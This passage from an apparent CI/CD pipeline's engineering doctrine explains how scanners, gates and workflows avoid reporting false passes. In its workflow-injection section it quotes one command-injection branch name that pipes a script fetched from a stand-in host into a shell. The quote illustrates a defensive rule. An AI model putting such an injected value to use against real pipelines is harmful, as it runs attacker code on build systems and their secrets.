# The engineering doctrine

Every rule below was a real false pass in this repository or in a consumer's
pipeline, measured before it was fixed. Each one names the mechanism that closes
the door and the trap that would reopen it; the linked spec holds the
measurements and the rejected alternatives. Read the spec before changing the
code a rule names. The module-level rules live beside this page in
[doctrine-security.md](./doctrine-security.md) and
[doctrine-quality.md](./doctrine-quality.md), and the vocabulary in the
[glossary](./glossary.md).

## A tool that could not run must never read as "clean"

Every scanner, linter and gate here reports zero findings both on a clean tree and
when it never executed, so the two must be distinguished explicitly. Never end a
tool command in `|| true`, `2>/dev/null`, or a fallback that fabricates an empty
report — capture exit status and stderr, classify them (`semgrepRunError`,
`eslintRunError`), and put a non-run in the envelope's `errors[]` so `passed=false`.
Never derive severity from a field the tool may omit (Semgrep OSS set no level on
any result; resolve through `rules[].defaultConfiguration.level`). Check that a
tool's flags actually enable the work (`trivy --format cyclonedx` drops
vulnerability scanning unless `--scanners vuln` is also passed). Each of these was a
real silent false pass; see [the security doctrine](./doctrine-security.md).

The same failure keeps arriving through new doors. Each rule below is one door,
with the mechanism that closes it and the trap that would reopen it. The spec holds
the measurements and the rejected alternatives — read it before changing the code
it names.

### `--fail-on NONE` never suppresses a non-run

`gatedPassed(ran, severityOK, threshold)` (`src/quality/gating.go`, `src/security/gating.go`, `src/risk/gating.go`, one byte-identical file held equal by `make check-surface`) gates only `severityOK`. A `NONE` run reporting `passed=false` means the pipeline could not do the work, and `errors[]` says which part.

### Narrowing the scope must be named, and must never narrow to nothing

`--include` with an unrecognised name is a hard error from `resolveIncludeNames` (`src/quality/include.go`) — no envelope, so nothing can be misread as a result. It used to resolve to an empty language set, the leg loop never iterated, and `allRan` stayed *vacuously* true. Auto-detection finding nothing is a **warned** pass (`quality: NO LANGUAGE DETECTED …`) because a docs-only repo is legitimate; a deliberate exclusion says so, quoting the marker path. The accepted-name set is held in `languageAliases` and in a shell `case` in `.github/workflows/precommit.yml`, and `check_include_language_set` fails CI when they disagree. Logic lives in an **untagged** file because `lint.go` is `//go:build !unit_test` and a `default`-less switch survived there untested. See [specs/refuse-a-language-set-that-scans-nothing.md](../../specs/refuse-a-language-set-that-scans-nothing.md).

### A tool that ran on part of the input must not read as having run on all of it

The SAST engine (Semgrep OSS then, Opengrep now) writes one `runs[].invocations[].toolExecutionNotifications[]` entry per file its parser rejected and per rule that timed out, and cicd copied the SARIF over without reading them: on a C# repository the row reported findings with `warningsCount 0` while the document beside it carried hundreds of parser notifications. `semgrepnotifications.go` (untagged, fixtures captured from the pinned image) classifies them into one `warnings[]` line and the row's count. A **warning**, not an error — the remedy is upstream's parser, the scan did run over the rest, and a permanent red gets SAST switched off along with its findings. Traps: a notification has **no `locations` array** (the path is only in `message.text`); the engine parses partially, so a rejected file can still yield findings, which is why the line says "a floor, not a verdict"; and a file skipped for size appears in the SARIF not at all. A warning was still not loud enough: a consumer's row read `✅ clean` beside it, so the count of files the engine named also rides the row as `Examined.partial`, and notify marks the Outcome cell `⚠️ partial scan`, appending to the outcome and never replacing it. Trap: Semgrep OSS skipped C# `record` declarations with **no notification**, so no count could include them — the reason the engine is now Opengrep 2.0.0, which parses them and emits the same notification shape ([specs/swap-semgrep-for-opengrep.md](../../specs/swap-semgrep-for-opengrep.md)). Its own residue: an unbalanced brace makes the rejected region the whole file, so the floor can be zero, and its taint fixpoint caps each dataflow node's visits silently, which nothing reports and so nothing can count. See [specs/mark-a-partly-read-scan.md](../../specs/mark-a-partly-read-scan.md).

### A rule-specific parser failure can be replaced only when cicd has an equivalent

The registry's `gha-curl-pipe-shell` rule made valid GitHub Actions expressions, command substitutions and multiline Markdown partial under both Semgrep OSS 1.161.0 and 1.162.0. `semgreprules.go` recognises that exact notification and reruns with only that rule replaced by a runtime-adapted YAML+regex equivalent. Pinned packs plan the adapted rule up front. The first-party adapter reads the upstream structure and notices from the pinned checkout; no upstream rule body is embedded. Generation or required-rule loading failure is a non-run. A successful substitution closes that rule-specific parser gap, not every possible scope gap; other parser failures remain partial-scan warnings. The generated rule retains the upstream restrictive terms: see [runtime rules licensing](../../THIRD_PARTY_NOTICES.md#default-semgrep-rules--semgrep-rules-license-v10-not-apache-20).

### A count of what a tool examined is what makes its findings a measurement

`Examined` states the denominator the finding count was measured over, so a scan of eleven files and a scan of eleven thousand stop rendering identically. It is the one scope field `cross-cutting/evidence` propagates verbatim — it drops `genericReport` — so a producer that does not set it renders "not stated" no matter how much its payload knows. See [specs/say-what-semgrep-examined.md](../../specs/say-what-semgrep-examined.md).

### A scanner that died must not be described as one that found nothing

The DAST leg decided a scan was clean from `Readiness.OK && URLsWithAlerts == 0`, but the probe runs *before* ZAP and against the application, so it answers 200 whether or not the scanner survives. `dast: NO ALERTED URL` therefore shipped seven lines above `zap: did not run (exit 3)` in this repository's own `composite-smoke-dast` output on `main`. `ScanCompleted` now answers it, set only when ZAP exited a status `zapRunError` accepts **and** the report it left parsed. Traps: `zapFailureDetail` keeps each stream's last non-empty line, which on every measured startup failure is `… DaemonBootstrap - ZAP … terminated` — the consequence, never the cause — so a bounded `ZapLog` tail (16 KiB per stream) is kept — on a non-run, and on a completed scan that recorded an `errors[]` entry anyway, because a completed run that imported only seed URLs had its explanation discarded just after cicd parsed a count out of it; and `-T` is not a whole-scan cap but the budget to start ZAP *and* finish passive scanning, so lowering it to fail faster on a dead daemon buys that speed with silent partial coverage. The budget is recorded and disclosed when nobody chose it, never changed. See [specs/tell-a-dead-zap-from-a-clean-one.md](../../specs/tell-a-dead-zap-from-a-clean-one.md).

### And a scan that reached nothing must not report the scope it was asked for

A ZAP run can report findings and pass while touching no declared API path. Both fields that look like scope can be correct without measuring the scan — `urlsWithAlerts` is bounded by the *findings*, so a cleaner target lowers it, and `endpointsFromSpec` is cicd's reading of the document, even when a scanner never started. `parseZAPScope` (`src/security/zapscope.go`) reads `Number of Imported URLs: N` and `Total of N URLs` on **every** invocation, failures included, and the end-of-scan count rides the envelope as `Examined{Unit: "URLs requested"}`. Traps: an unsaid count is `nil`, never `0`, except that the total line cannot carry zero (the scans log `No URLs found …` instead), so reading only that line would make the most important value the one that is always absent; `Examined.Total` stays unset because `Total` must share `Count`'s unit and an operation is not a URL; and `zap_tune` caps every passive rule at ten alerts unconditionally, so rules sitting on exactly ten are named and deliberately not called truncated.

### And a count can never say *which*

Comparing alerted URLs with declared operations mixes different units and needs an arbitrary threshold; naming unreached paths needs neither. A mounted `--hook` dumps `zap.core.urls()` and `reconcileAPIReach` (`src/security/apireach.go`) sets it against the document's declared paths: zero reached is an `errors[]` entry, a partial gap names the unreached paths in `warnings[]`, and an unreadable dump warns rather than fails, because the scan ran and only cicd's instrument did not. Traps: the hook is stashed at `zap_tuned`, never `zap_started`, because `trigger_hook` feeds a hook's return value back to the caller whenever it passed more than one argument; every trigger body swallows its own exceptions, since the packaged scan catches one as "Unexpected error" and exits 3, turning a finished scan into a non-run; the dump is renamed into place, or a truncated list names reached endpoints as unreached; a path template expands to `[^/]+`, never `[^/]*`; a requested URL must share the target's hostname, or a redirect to an external host credits a declared path; a concrete declaration beats the template that would also match, the way a server routes; and `-O`'s own path is a prefix candidate, because the override prepends it to every imported path while the document never mentions it.

### And when a scanner throws the input away, only the scanner knows

A consumer's DAST leg imported only seed URLs, scanned them, exited 0 and reported every rule PASS. ZAP had refused the document — swagger-parser caps snakeyaml at 3,145,728 code points and re-parses the *expanded* OpenAPI 3 form, so even a comparatively small Swagger 2.0 input can overrun it after reference expansion — and `zap-api-scan.py`'s only guard is `if len(urls) == 0: raise NoUrlsException()`, which the URLs `-O` had already seeded satisfied. The reason existed in exactly one place: ZAP's own `/home/zap/.ZAP/zap.log`, a third stream cicd was not reading, because the wrapper logs the import's answer at `logging.debug`. Two changes. `JAVA_TOOL_OPTIONS=-DmaxYamlCodePoints=` (`zapYAMLCodePointLimit`, 32 MiB) lets the same document import its API URLs — via the env var and not `.ZAP_JVM.properties`, whose first line `zap.sh` reads into `JMEM` verbatim and thereby switches off its own `-Xmx = MEM/4` sizing, which is this doctrine one door over. And `zapimport.go` (untagged, fixtures captured from the pinned image's real log) greps that log and makes a refusal an `errors[]` entry, stated **beside** `apiReachError` and not instead of it: the reach error is the symptom, this is the cause, and neither implies the other. Traps: match ZAP's own API path (`/JSON/(openapi|soap|graphql)/action/import`), never the parser's wording, which belongs to whichever library upstream bundles this month; grep's `-A 30` sweeps up the *next* log entry, so a header line survives only if grep matched it and a continuation line only if its header did; `daemonLevels` rides along **only** on a rejection, because the sentence naming the limit is four entries away from the rejection while a *successful* import can log unrelated WARNs explaining nothing; and the no-log status `127` is spelled in shell and read in Go, so `zapRunScript` moved out of the `!unit_test` file to be testable.

### And a secrets scan must open what the output ships

`ScanArchive` exists to catch a `.env` bundled into a build output, and gitleaks v8.30.1 defaults `--max-archive-depth` to **0**: an output holding only `app.zip` with two credentials inside logged `scanned ~0 bytes`, `no leaks found`, exit 0, `passed=true`. Both `dir` legs now open `gitleaksMaxArchiveDepth` (3) layers, and that is half the fix, because gitleaks decides what an archive is by **extension** — a `.jar`, `.nupkg`, `.war`, `.whl` or `.tgz` is an opaque binary at any depth, which is exactly what a Java or .NET output holds. The tree leg runs at `--log-level debug` and `gitleaksarchives.go` (untagged, fixture captured from the pinned image) names those files, and archives nested past the limit, in `warnings[]`; the row states `Examined` in bytes read. Traps: DBG logs **decoded** file content past `--redact`, so `gitleaksScript`'s awk drops every DBG line but one field-matched shape before anything reaches the disk, and a filter that did not finish is exit 125 and `errors[]`, never an empty list; and the disclosure is wording-coupled, so a gitleaks bump means recapturing the fixture. The depth applies to `ScanSource` too, so a pre-commit gate can go red over a secret in a committed zip it never opened before. See [specs/open-the-archives-the-output-ships.md](../../specs/open-the-archives-the-output-ships.md) and CAPS-065.

### An artifact shape that attests nothing must say which nothing

`commit.Run --artifact none` runs `build.NoArtifact` (`src/build/noartifact.go`), a warned pass carrying `genericReport.artifactAttested: false` and a warning naming the five skipped functions and what the `sbom.cdx.json` beside it (stage-2's Trivy-FS source SBOM) actually describes. Warned, not failed: a library has nothing deployable. `scripts/smoke/commit-shapes.sh` asserts the warning for `none` and its **absence** for the other two shapes — a disclosure on every run is noise. See [specs/say-what-no-artifact-left-unattested.md](../../specs/say-what-no-artifact-left-unattested.md).

### A gate that is switched off must say so

The change-intent gate is opt-in: `stage-2` runs it only with `--require-intent`, `precommit` forwards the flag, `commit` exposes none (it runs on the push that already merged). `intent.Check` still runs when not required and returns `genericReport.required: false` plus the warning `intent-gate: NOT REQUIRED …`. Two traps: the module flag is **negative** (`notRequired`) because Dagger's Go client drops any optional argument at its zero value, so an optional bool can only be transmitted as `true`; and Dagger parses `+default=` pragmas anywhere in a doc block, so quoting one as prose silently becomes the real default. See [specs/make-the-intent-gate-opt-in.md](../../specs/make-the-intent-gate-opt-in.md) and ADR-005.

### A gate that grades prose must not fail on its own blind spot, and cannot grade a document it only partly read

Two intent-gate fixes. `checkRefsCoupling` also asks the reverse question (`changedNameMentioned`: does the artifact contain a changed file's name verbatim?) because `pathToken`'s 3-char stem minimum made `ci.yml` invisible and the cheapest way to silence the false red was deleting the most valuable sentences in a capsule. And `extractYAMLText` tracks block scalars bounded by the key's indentation instead of deciding line by line — the old version dropped or truncated any prose line holding a colon, so 15.1% of the corpus never reached a rule, in **both** directions. `isBlockScalarHeader` stays exact. See [specs/see-the-file-the-artifact-named.md](../../specs/see-the-file-the-artifact-named.md) and [specs/grade-the-whole-artifact.md](../../specs/grade-the-whole-artifact.md).

### A historical rationale is not a new claim about this diff

Rounding a measurement in an old spec used to require that spec's historical
implementation to appear in the new diff: `checkRefsCoupling` judged the whole
artifact. `runArtifactRules` now keeps all prose checks whole-document but
couples an in-place edit only on newly introduced file references. It reverses
validated hunks against the current artifact before extracting both documents,
because replacement lines can repeat old filenames and YAML block scalars need
their surrounding structure. New/copied/renamed artifacts still couple in full;
new unrelated references still fail, and an inherited coupling witness cannot
clear them. Unreadable textual hunks are refused even at `--fail-on NONE`, not
read as an edit introducing nothing, and the narrowed scope is named in
`warnings[]`. Human review still judges changed claims about repeated references.
See [Couple the edit, not the artifact's history](../../specs/couple-the-edit-not-the-artifacts-history.md).

### A finding's location is part of its identity

`dedupeFindings` keys on the whole `Finding` struct, and `Finding` carries `Line` — without it three leaked credentials in one `.env` rendered as one row under a count of three. A tool that reported no line yields 0, never a guessed 1. TruffleHog emits no `locations` array and has a 0-based-offset quirk; see [specs/give-a-finding-its-line.md](../../specs/give-a-finding-its-line.md) and [the security doctrine](./doctrine-security.md).

### And the same door opens one field over

`dotnet format --report` names a file twice — a bare `FileName` and an absolute `FilePath` — and quality put the bare name in the uri, so two same-named files in different folders holding the same violation on the same line were one identity. Dropping the folder lets distinct findings collapse in the combined table while the severity count stays unchanged. The uri is now `FilePath` with the container mount stripped, and a fallback to `FileName` is counted into `warnings[]`. The fixture must model the tool's separate name and path fields — putting a path in `FileName` lets the suite agree with the assumption being corrected.

### And a truncated table must keep the rows a reader came for, by a rule it states

`combined.findings` is capped at 1000 rows, and the cap kept the head of a list sorted by severity *alone* — so within a severity the order was the composite's parts list. A formatter flood can fill the retained tier with dotnet-format `WHITESPACE` rows and drop same-severity Semgrep security findings. "Most severe kept" was true and the table lied by omission. `compareFindings` (`src/cross-cutting/evidence/findingorder.go`) is now a **total** order — severity, then the class of the producing module (security, risk, intent, unknown, then quality, ranked by flood risk rather than importance), then every remaining field. The class comes from the **module** whose envelope the row was read out of, tagged in `mergeFindings` at the one moment the producer is known, never from a tool-name table that rots with upstream renames; `TestFindingClassCoversEveryModule` walks `src/` and refuses an unclassified module **and** an empty walk. The warning quotes `findingOrderRule` verbatim so the sentence and the comparator cannot drift apart. `notify` takes the **head** and never re-sorts: a `Finding` does not carry its module, so a sort there could only be by severity and would undo the class order.

### The report a gate writes must not be co-authored by the thing it grades

`notify` renders branch names, commit values, scanner paths and every `warnings[]`/`errors[]` entry inside markdown; a refname may legally contain a backtick, `|`, `<`, `>` and `&`. `codeSpan` fences per CommonMark §6.1 (longest internal backtick run plus one) and never strips, because editing a path changes a finding's location. Traps: pad both ends or neither; `cellCode` must trim before it pads because `escapeCell` ends in `TrimSpace`; and the test asserts a **round trip** via `decodeCodeSpan`, not "looks safe", because "looks safe" passes a version that strips. `card.go` is deliberately unfenced and says why. See [specs/fence-the-span-a-branch-name-can-close.md](../../specs/fence-the-span-a-branch-name-can-close.md).

### And a notification nobody received must not report success

`notify.Teams` returned `error`, and three composites logged it to stderr, so a card delivered, a webhook never configured and a card lost all read identically: green. `teamsWebhook != nil` was the configuration test, and under GitHub Actions `secrets: inherit` a secret the calling repository never defines still arrives as a non-nil, **empty** Secret — so every consumer who had not set Teams up POSTed to the empty string on every run, wrote `unsupported protocol scheme ""` into a twenty-minute log, and exited zero. Teams now returns an evidence envelope: `CLEAN` delivered, `SKIPPED` not configured, `ERROR` attempted and lost, with `passed=true` in all three because a notification is not a gate — reddening a scan over a webhook outage teaches a team to stop passing the webhook, which is this defect from the other side. Traps: the composites aggregate **twice**, because notify consumes `Wrap`'s output and cannot be inside it, and that second `Wrap` is also what *performs* the POST — a function returning `*dagger.File` is lazy, so skipping it stops sending cards rather than saving a merge; the rules live in an **untagged** file, because the one that was wrong was unreachable from any test inside the `!unit_test` entry function; a malformed URL is attempted and an unexpanded ADO `$(NAME)` macro is not, since ADO expands an undefined variable to its own literal text and calling that a dead webhook misnames a channel nobody ever had; and routing the failure into `warnings[]` publishes it into the PR comment, where a proxy quoting the request *target* would leak the token in the webhook's path — `teamsScrubValues` registers the path and query, and the test that found the leak asserts on the serialised JSON. `check_guarded_flags` (check 20) keeps the flag conditional on all seven starter surfaces: the array alone is not the guard, and the condition is read without its body, or a guard testing `NPM_FEED_TOKEN` vouches for `TEAMS_WEBHOOK`. See [specs/tell-a-dead-teams-webhook-from-an-unconfigured-one.md](../../specs/tell-a-dead-teams-webhook-from-an-unconfigured-one.md) and CAPS-061.

### And a scan scoped to one push must not report the coverage of a gate

The commit stage passed its diff to `risk.Validate`, which scoped the infra scan to the files that push touched while the tree's other parseable files sat unread. A Dockerfile examined on a commit that edits it is not revisited on an unrelated push, and a file that became a misconfiguration when a *policy* was added can remain unexamined. Precommit keeps the change scope, where a pull request owning the infra it changes is the right answer; commit reads the tree, like every other concern on that stage already did. The scope is a named parameter (`--infra-scope changed|tree`), refused when unrecognised with no `default:` arm, because both fallbacks are silent. The worse half was the zero: `SKIPPED` with `count: 0` is byte-for-byte what a repository with no infrastructure reports, and the candidate count existed nowhere — the loop filtered by the change set **before** it classified, so a file the scan skipped was never classified either. `planInfraScan` classifies first, and `Examined.Total` carries the denominator in the same unit. Traps: a candidate is a file conftest has a *parser* for, so Bicep is not counted — a total no change can move looks like a ratio and is a worse lie than a bare zero; the sentence rides `warnings[]`, since `examined` is structured and the PR comment is where this was misread, and it is silent when the scope excluded nothing; and the rules are **untagged**, because `opa.go` is `!unit_test` and the scoping decision was unreachable from any test for as long as it was wrong. See CAPS-062.

### A gate the consumer cannot clear gets switched off, so cicd clears it

Trivy reads NuGet dependencies only from a lockfile or `*.deps.json`, never a `.csproj`, and most .NET repos commit none. When a .NET tree declares the ecosystem and holds no readable input, `runTrivyFS` restores the graph itself in a digest-pinned SDK — no flag on, no flag off. A failed or **partial** restore is an `errors[]` entry; a success *warns* about the floating-version gap. The reconciliation reads the **original** probe, not the restored tree, or the fallback's output would clear the check that judges it. See [specs/scan-nuget-without-a-lockfile.md](../../specs/scan-nuget-without-a-lockfile.md).

### A tool with two command lines must be asked which one it has

`dotnet test` is VSTest or Microsoft.Testing.Platform, with disjoint flag sets; the runner is read from the root `global.json` (`"test": {"runner": …}`, the only mechanism that selects the CLI), an unreadable answer is an error, `dotnetTestArgs` has no `default:` arm, and the runner is named in `warnings[]`. MTP writes `<guid>.cobertura.xml`, needs `--coverage-output-format cobertura`, and exit 2 is a test *failure*, not a non-run. An empty cobertura (`<packages />`, no `lines-valid`) parsed as **100%**. See [specs/detect-the-dotnet-test-runner.md](../../specs/detect-the-dotnet-test-runner.md).

### An error naming one line of a long log is a claim, not evidence

When `dotnet test` exits non-zero and every test passed, the `errors[]` entry quoted one line of a file that died with the container — on one consumer run (every test passed, exit 1) it quoted a tool-restore `Unhandled exception` that a `ContinueOnError="true"` `Exec` may well have swallowed, and nothing could check. `dotnetKeepOutput` (`src/quality/dotnetoutput.go`) keeps a bounded tail in `genericReport` when the exit is not explained by `tests.failed` or the run was classified a non-run: 200 lines, 2 KiB per line, 64 KiB per target, plus up to 20 distinct lines matching a known failure signature, each cap a named constant with its reasoning. A failing suite keeps **nothing**, because `tests.failed` already verifies the claim. Two mechanics are load-bearing: every route from tool output to envelope passes `scrubCredentials` (`redact.go`), and the test asserts on the **serialised JSON** rather than a struct field, because the field that was missed is the leak; and `truncatedLines` counts over the lines *stored*, not the lines considered — the first version said 200 about a tail the byte cap had cut to 31.

### A harvest that read nothing must not report a ratchet it never ran

MTP writes cobertura with a UTF-8 BOM, which `strings.TrimSpace` does not remove, so `sniffCoverageReport` recognised no format and the leg recorded the fail-open `ratchetSkipNoCoverage` over unread coverage documents. `coverageSetErrors` makes found-and-none-read an `errors[]` entry; `Matched == 0` stays a warning; a partial harvest stays a warning naming the unreadable documents. The BOM is stripped **once**, before the format switch.

### A witnessed language is not a witnessed repository

`quality.Test` attests per language, so a command running only a subset of a solution's projects looked identical to one running all. `dotnetLegScopeWarning` states `projectsDiscovered` / `testProjectsDiscovered` / `coverageDocumentsMerged` and refuses to divide them, since cicd cannot know the intended scope. It fires on every .NET BYO run, which is defensible only because the same values are structured fields a consumer can diff across envelopes (nothing in cicd diffs them). `CoverageDocumentsMerged` is a pointer: nil is no harvest, 0 is a harvest that merged nothing. Node is left undone because the unit is undecided.

### And two resolvers for one question means one of them is wrong

`quality.Test` ran a consumer's own `dotnet test` in `mcr.microsoft.com/dotnet/sdk:8.0` against a tree whose every `.csproj` declares `net10.0`: each project answered `error NETSDK1045: The current .NET SDK does not support targeting .NET 10.0`, the coverage harvest then found no results directory at all, and the envelope said `test command failed (exit 1)` and nothing else. cicd's own probe had printed `<TargetFramework>net10.0</TargetFramework>` a few Dagger nodes earlier in the same run — `quality.Check`'s two .NET legs read it through `dotnetResolveBand`, and the BYO leg resolved through `ResolveToolchainDetail`, which for .NET reads `global.json` and nothing else. No `global.json` meant no request, no request meant the compile-time default. It was silent because `Note` fires on a version file *present* and not decisive, so the one case where the choice was both wrong and unaskable disclosed nothing. `dotnetTestToolchain` (`src/quality/dotnettoolchain.go`, untagged) now decides from the same probe the Check legs read. Traps: the image stays the readable tag and not the digest-pinned `dotnetSDK*Image`, because ADR-004 level 3 is the consumer's container and only the band was wrong; `byotest.go` is `//go:build !unit_test`, so the rule had to move out to be asserted on at all; a band cicd served exactly carries **no** Note, or a correct resolution adds a line to every .NET run; and `toolchain.go` is a *generated copy* in `quality` and `build`, so the new resolution level is added to `src/internal/detect/toolchain.go` and synced — `check_generated_files` refuses the edit to the copy. Residue: `build.BuildArchive` still resolves the same way and has no `warnings[]` to say so. See [specs/run-a-byo-test-in-the-sdk-the-repository-needs.md](../../specs/run-a-byo-test-in-the-sdk-the-repository-needs.md).

### A file cicd read and could not use must not look like a file that was never there

`ResolveToolchainDetail` reports the image, the level that chose it (`explicit`/`nvmrc`/`global-json`/`default`) and a note; `quality.Test` warns and records `toolchainFrom`/`toolchainNote` per leg. The trigger is "present but not decisive" — `lts/iron` (idiomatic nvm, unresolvable here) and a runner-only `global.json` with no `sdk` key, which is the file this repository's own guidance tells consumers to write. No version file, no line. `ResolveToolchain` stays as a wrapper and every table row asserts image equality. `build.BuildArchive` returns a `*dagger.Directory` and so has no `warnings[]` — documented, not fixed. See [specs/name-the-version-file-cicd-could-not-use.md](../../specs/name-the-version-file-cicd-could-not-use.md).

### A knob nobody can reach and a knob nobody needs look identical from outside

`security.ScanLicenses` has carried `--license-gate`, `--license-allow` and `--license-exclude` for several releases, and `commit.yml` exposed none of them for five releases while `precommit.yml` exposed all three; both Azure DevOps starters forwarded none either, which the original consumer report did not know. `check_composite_params_reachable` (`scripts/repo_surface.py`, check 19) mangles each composite `Run` parameter to its Dagger flag and requires every starter surface that calls that composite to name it, or to carry a written reason in `composite_reach.unreachable` — where an exemption for a parameter now reached is itself a problem, so the list cannot rot into a suppression. Behind the wiring, two classification defects: the rationale comment called LGPL `reciprocal` when Trivy files it under `restricted` beside GPL (and AGPL under `forbidden`), so `--license-allow reciprocal` read as the weak-copyleft tier while the one real cliff went unnamed — `licensecategories_test.go` pins the taxonomy to a fixture whose `trivyVersion` must equal the pinned scanner's, so a bump without a re-read fails. And `--license-allow` now takes declared *names* beside categories, because both declarations behind a consumer's licence findings (`BlueOak-1.0.0`, absent from Trivy's table; `SEE LICENSE IN LICENSE`, absent from its `normalize.go`) land in `unknown`, whose only category-level remedy accepts every future unclassifiable one. Traps: the name check runs **after** the category check, or an allowance covering only already-allowed declarations records hits and never warns; a name matches the **whole** declared string and operands are never evaluated, since a licence table inside cicd would be a second, quieter policy; `unknown` is no longer allowable and that breaking change errors loudly rather than being reinterpreted; an unscoped all-lowercase word is refused, because once names are accepted `--license-allow permisive` would silently become an allowance for a licence nobody declares; and prose is stripped before a surface is graded, the `check_cross_module_develop` lesson, since the ADO starters document `--include` in a comment precisely because it must not be a variable. Residue: a declared string containing a comma is reachable only by calling the module directly. See [specs/reach-the-license-policy.md](../../specs/reach-the-license-policy.md).

### An acceptance nobody can read is indistinguishable from a bug

Eight MEDIUM otel rows sit on this repository's own gate that no commit here can clear — `dagger develop` rewrites the four `replace` lines from the SDK's go.mod on every run, per module, and CAPS-058 measured what committing a higher pin does: go.mod advertises a version the build does not use, which is a green scan over a dependency that is not there. The mechanism that existed for that was `.trivyignore`, and it is the wrong one: Trivy drops an ignored ID *before* it writes the report, so the row is absent from the native document, from `findings[]`, from the counts and from the envelope — four of this repository's eight rows were invisible in its own evidence for exactly that reason, under thirty lines of reasoning no reader of the evidence ever saw. `--vuln-accept "<id>=<reason>"` (`src/security/vulnallow.go`) takes the row out of the counts, `findings[]` and the gate and puts the identifier, the rows it covered and the reason **as written** into `warnings[]`. Four rules: it narrows what a scan *reports* and never what it *examines*, so every filtering knob stays pinned on Trivy's command line; a reason is mandatory and ungraded, because the whole difference from a suppression is that a human wrote one; it names exactly **one** identifier, since a pattern also covers the finding nobody has read yet; and an acceptance that covered nothing gets its own louder line, because a stale acceptance is a standing permission for that ID to return unreviewed. Traps: `warnings[]` is the channel and not `genericReport`, which `cross-cutting/evidence` drops — a structured-only record would be exactly as invisible as the `.trivyignore` entry it replaces; `partition` returns a **copy** and `trivyResolvedTypes` plus the CycloneDX document keep reading the original, or a Result holding only accepted rows vanishes and the ecosystem reports unresolved, an acceptance manufacturing a non-run; the parameter is **one `String`**, newline-separated, and the splitting happens in Go, because Dagger exposes a `[]string` as a pflag `StringSlice` that CSV-parses its value — the flag shipped that way and the dogfood run it was built for died on its own reason, arriving as seven fragments cut at every comma, while a value containing a newline is truncated at it with **no error at all** (measured against the CLI with a probe module); the separator is a newline and not the comma `--license-allow` uses because a reason is prose and a reason truncated at its first comma still looks like a decision was written down, whose stated price is that a reason cannot wrap — a continuation rule would swallow an unparseable line into the reason above it and silence the "names no reason" refusal; and a consumer's `.trivyignore` is still honoured but now **disclosed** (`trivyignore.go`, root-only, because that is the only place Trivy looks) — neutralising it is doctrinally cleaner and was rejected on blast radius, since it turns every consumer who has one red with no warning first. See [specs/accept-a-vulnerability-in-the-open.md](../../specs/accept-a-vulnerability-in-the-open.md), CAPS-059 and CAPS-060.

The same door stood open in gitleaks, three times over: `gitleaks:allow`, `.gitleaksignore` and a root `.gitleaks.toml` each remove a finding before the report exists, and this repository's own config had replaced every default rule with none. Each removal is now put back as an accepted SARIF suppression, uncounted and named per mechanism in `warnings[]`, and a scan that loaded no rules is a non-run. See [specs/disclose-gitleaks-suppressions.md](../../specs/disclose-gitleaks-suppressions.md).

## The same doctrine at the harness

### Our own workflows use no third-party actions

The intended Actions policy is `selected` (GitHub-owned and verified-creator only). Effective destination settings require separate verification. Under a restrictive policy, a disallowed action can prevent startup: no check run is published and the workflow vanishes from the PR check list. A source-era outage exposed that failure mode. Install tools with `go run <module>@<version>` or a local composite action under `.github/actions/`. The trust set is `workflow_actions` in `scripts/repo-inventory.json`, enforced by `scripts/check-repo-surface.py`; a third-party action needs a `third_party_allowed` entry with a reason. See [specs/keep-pipelines-startable.md](../../specs/keep-pipelines-startable.md).

### A workflow step must stay small enough to start

A `run:` body above roughly 24 KB makes GitHub refuse the workflow at startup the same silent way; it is per step, size not content, and `actionlint` exits 0. `check_workflow_step_sizes` holds every `run:` body under `STEP_RUN_BUDGET_BYTES` (16 KiB, deliberate headroom). Split the step or move it to `scripts/` — never raise the budget. See [docs/reference/workflow-step-size.md](../reference/workflow-step-size.md).

### A workflow value reaches the shell as an argument, never as source

GitHub substitutes a `${{ }}` expression into a `run:` body before the shell parses it, so the value becomes script text and quoting it does nothing: a branch named `x";curl${IFS}evil.sh|sh;"` is a legal ref and closes the quote itself. `check_run_expressions` refuses any expression inside a `run:` body across the workflows, local actions and GitHub templates. The rule is absolute, not an allowlist of safe contexts, because deciding which context is attacker-shaped is the judgement that let `github.ref_name` through. `github.*` values are already `GITHUB_*` variables; everything else goes through the step's `env:` and is read as `"$NAME"`. The Azure DevOps half is `check_value_interpolation`.

### And a pin nothing can read is not a pin at all

v3.8.4 tagged a `.github/workflows/dast.yml` whose two module references read `src/composites/dast@fix/dast-evidence-write` — the development branch of the PR that had just merged and deleted it. Every consumer of `dast.yml@v3.8.4` asks the CLI for a module that resolves to nothing, and both pin gates reported OK on the tagged commit. All three mechanisms key on the same shape — the bumper's `CICD_PIN_PATTERNS`, the skew scan's `VERSION_SCAN`, and `DAGGER_CALL_RE` — so a ref in any other shape is not reported as wrong, it is *not seen*, and `call scan`/`call package` went unresolved and therefore unchecked as a side effect. `check_cicd_refs_are_versions` asks the prior question — is the ref a version at all? — and refuses a branch, `main`, a commit sha (immutable, and still invisible to the bumper) and `@v1`, which looks idiomatic and resolves to nothing here because this repository publishes no moving major tag. It runs in the **release-blocking** `check-workflow-pins.py`, not only the wider surface gate: the repair is a pin rewrite by the same script on the same line as a skew repair, and the wider gate's verdict is not what the release pipeline consults. `pin_guard.pending_repairs` does not reach it — that tolerance is for a pin that *lags*, and a ref that is not a version never becomes correct by being bumped. Historical documents are out of scope by construction, because the spec for this fix quotes the broken ref. Residue: the tag stays broken, since moving a published tag is worse than the bug. See [specs/refuse-a-cicd-ref-that-is-not-a-version.md](../../specs/refuse-a-cicd-ref-that-is-not-a-version.md).

### A check nobody wrote is the cheapest version of the same lie

No target ran `gofmt`, and `src/internal/.golangci.yml` declares no `formatters:` key, so `make lint` was silent on two unformatted files exactly as on a clean tree. `scripts/check-go-format.py` audits tracked files with three answers: exit 2 covers a working `gofmt` over an *empty* file list. What green here does **not** mean: errcheck, govet and staticcheck, which the Dagger-free job cannot run on a module; `scripts/ci/lint-modules.sh` (`make lint-modules`, the `lint-modules` job) lints every module in both build-tag sets, with `unused` judged only by the untagged pass since in the `unit_test` set every entry-function constant truly is unused, and `schema.go`'s generated verdict helpers excluded by name in `src/.golangci.yml`. See [specs/refuse-go-no-formatter-has-seen.md](../../specs/refuse-go-no-formatter-has-seen.md).

### And a step that could not fetch must not wear a compile error's face

